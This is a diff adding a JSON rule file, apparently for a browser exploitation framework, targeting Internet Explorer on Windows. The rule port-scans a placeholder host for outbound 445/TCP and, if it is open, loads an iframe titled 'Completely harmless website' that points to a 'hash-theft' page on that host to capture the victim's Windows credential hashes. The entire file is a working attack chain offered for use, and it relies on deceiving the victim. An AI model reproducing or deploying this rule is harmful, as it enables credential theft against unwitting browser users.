@@ -1,0 +1,40 @@
+{
+	"name": "Scan for 445/TCP Outbound, grab hashes if open",
+	"comment": "IE Rule: Run a port scan to determine if 445 outbound is open. If it is, redirect to a hash theft exploit.",
+	"author": "https://github.com/highmeh",
+	"browser": "IE",
+	"browser_version": "ALL",
+	"os": "Windows",
+	"os_version": "ALL",
+	"modules": [
+		
+			{ 
+			"name": "port_scanner", 
+			"condition": null,
+			"options": { 
+				"ipHost": "x.x.x.x",
+				"ports": "445",
+				"closetimeout": "1100",
+				"opentimeout": "2500",
+				"delay": "600",
+				"debug": "false"
+
+						}
+		},
+
+		{ 
+			"name": "site_redirect_iframe", 
+			"condition": "status==1",
+			"options": { 
+				"iframe_title": "Completely harmless website",
+				"iframe_favicon": "http://x.x.x.x/favico.ico",
+				"iframe_src": "http://x.x.x.x/hash-theft/index.html",
+				"iframe_timeout": "3500"
+						}
+		}
+	],
+
+	"execution_order": [0,1],
+	"execution_delay": [0,2000],
+	"chain_mode": "sequential"
+}
